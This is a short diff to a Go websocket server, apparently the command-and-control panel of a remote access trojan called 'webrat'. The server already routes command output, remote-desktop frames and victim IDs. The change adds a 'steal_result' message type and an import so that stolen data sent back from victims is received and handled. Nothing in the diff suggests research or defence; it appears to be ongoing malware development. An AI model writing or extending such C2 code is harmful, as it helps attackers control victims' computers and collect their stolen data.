@@ -8,6 +8,7 @@ import (
 	"sync"
 	"time"
 
+	"webrat-go-api/internal/httpapi"
 	"webrat-go-api/internal/storage"
 
 	"github.com/gorilla/websocket"
@@ -205,6 +206,8 @@ func (h *Hub) HandleHTTP(w http.ResponseWriter, r *http.Request) {
 			h.handleCommand(ws, payload, panelLogin)
 		case "cmd_output":
 			h.handleCmdOutput(ws, payload)
+		case "steal_result":
+			h.handleStealResult(ws, payload)
 		case "rd_frame":
 			h.handleRDFrame(ws, payload, associatedVictimID)
 		}
